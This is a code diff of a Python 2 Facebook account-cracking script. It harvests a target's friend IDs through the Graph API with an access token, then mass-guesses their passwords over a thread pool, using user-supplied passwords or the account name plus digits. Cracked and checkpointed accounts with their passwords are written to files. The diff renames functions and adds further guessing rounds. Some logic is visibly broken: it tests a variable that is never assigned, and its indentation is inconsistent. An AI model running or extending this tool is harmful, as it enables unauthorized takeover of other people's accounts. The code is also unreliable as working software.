@@ -63,7 +63,7 @@ def cetak(b):
     sys.stdout.write(x+'\n')
 
 
-def hamza(z):
+def jam(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
@@ -143,8 +143,8 @@ def menu2_menu():
         choice2()
     elif m2m =="0":
         os.system('clear')
-        hamza('Please Wait.')
-        hamza('While Is Returning To Main Menu.')
+        jam('Please Wait.')
+        jam('While Is Returning To Main Menu.')
         time.sleep(1)
         os.system('python2 sani.py')
     else:
@@ -181,15 +181,12 @@ def choice1_menu():
 		idt = raw_input("[✓] Enter ID : ")
 		pass1=raw_input("[1] Input Password  : ")
 		pass2=raw_input("[2] Input Password  : ")
-		pass3=raw_input("[3] Input Password  : ")
-		pass4=raw_input("[4] Input Password  : ")
-		pass5=raw_input("[5] Input Password  : ")
 		print(47*"-")
 		print (banner)
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			hamza("[✓] Account  Name: "+op["name"])
+			jam("[✓] Account  Name: "+op["name"])
 			
 			time.sleep(0.5)
 		except KeyError:
@@ -207,6 +204,7 @@ def choice1_menu():
 		try:
 			idlist = raw_input("[✓] Enter File Path  : ")
 			pass1=raw_input("[1] Input Password  : ")
+			pass2=raw_input("[2] Input Password  : ")
 			print(47*"-")
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -220,11 +218,136 @@ def choice1_menu():
 		print ("[!] Fill in correctly")
 		choice1_menu()
 	rana = str(len(id))
-	hamza ("[✓] Total Friends: "+rana)
+	jam ("[✓] Total Friends: "+rana)
 	time.sleep(0.5)
-	hamza ("[✓] The Process Has Been Started.")
+	jam ("[✓] The Process Has Been Started.")
 	time.sleep(0.5)
-	hamza ("[!] Press CTRL Z To Stop Process")
+	jam ("[!] Press CTRL Z To Stop Process")
+	time.sleep(0.5)
+	print (47*"-")
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		(uid, name) = user.split('|')
+		try:
+		    os.mkdir('save')
+		except OSError:
+		    pass
+		try:
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
+		    if "loc" in q:
+			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
+			ok = open('/sdcard/ids/jam_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass1 + '\n')
+                        ok.close()
+                        oks.append(uid + pass1)
+		    elif 'www.facebook.com' in q['error']:
+			print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
+			cp = open('jam_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass1 + '\n')
+                        cp.close()
+                        cps.append(uid + pass1)
+		    else:
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
+		        if "loc" in q:
+			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
+			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass2 + '\n')
+                            ok.close()
+                            oks.append(uid + pass2)
+		        elif 'www.facebook.com' in q['error']:
+			    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
+			    cp = open('jam_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass2 + '\n')
+                            cp.close()
+                            cps.append(uid + pass2)
+			
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;97m----------------------------------------------"
+	jam('[✓] Process Has Been Completed.')
+	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
+	xx = str(len(oks))
+	xxx = str(len(cps))
+	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
+	print (47*"-")
+	raw_input("\nPress Enter To Back ")
+	choice1()
+
+def choice2():
+	global toket
+	os.system("clear")
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print("[!] Token invalid")
+		os.system("rm -rf login.txt")
+		time.sleep(1)
+		os.system("python2 jam.py")
+	os.system("clear")
+	print banner
+	print ("[1] Crack From Any Public ID.")
+	print ("[2] Crack From File.")
+	print ("[0] Back")
+	print ("        ")
+	choice2_menu()
+
+def choice2_menu():
+	c2m = raw_input("\nChoose Option >> ")
+	if c2m =="":
+		print ("[!] Fill in correctly")
+		choice_menu()
+	elif c2m =="1":
+		os.system("clear")
+		print (banner)
+		idt = raw_input("[✓] Enter ID : ")
+		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+		print (47*"-")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			jam("[✓] Account  Name: "+op["name"])
+			time.sleep(0.5)
+		except KeyError:
+			print("[!] ID Not Found!")
+			raw_input("\nPress Enter To Back ")
+			choice2()
+		print"\033[1;35;40m[✺] Getting IDs..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif c2m =="2":
+		os.system("clear")
+		print (banner)
+		try:
+			idlist = raw_input("[✓] Enter File Path : ")
+			p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+			print(47*"-")
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\nPress Enter To Back ")
+			choice2()
+	elif c2m =="0":
+		menu2()
+	else:
+		print ("[!] Fill in correctly")
+		choice2_menu()
+	rana = str(len(id))
+	jam ("[✓] Total Friends: "+rana)
+	time.sleep(0.5)
+	jam ("[✓] The Process Has Been Started.")
+	time.sleep(0.5)
+	jam ("[!] Press CTRL Z To Stop Process.")
 	time.sleep(0.5)
 	print (47*"-")
 	
@@ -252,22 +375,39 @@ def choice1_menu():
                         cp.write(uid + ' | ' + pass1 + '\n')
                         cp.close()
                         cps.append(uid + pass1)
-			
+		    else:
+			pass2 = name.lower() + p2
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
+		        if "loc" in q:
+			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
+			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass2 + '\n')
+                            ok.close()
+                            oks.append(uid + pass2)
+		        elif 'www.facebook.com' in q['error']:
+			    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
+			    cp = open('jam_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass2 + '\n')
+                            cp.close()
+                            cps.append(uid + pass2)
+
+										
+																	
+															
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(20)
 	p.map(main, id)
 	print "\033[1;97m----------------------------------------------"
-	hamza('[✓] Process Has Been Completed.')
-	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
+	jam('[✓] Process Has Been Completed.')
+	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
 	xx = str(len(oks))
 	xxx = str(len(cps))
 	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
 	print (47*"-")
 	raw_input("\nPress Enter To Back ")
-	choice1()
-	
+	choice2()
 	
 if __name__ == '__main__':
 	menu2()
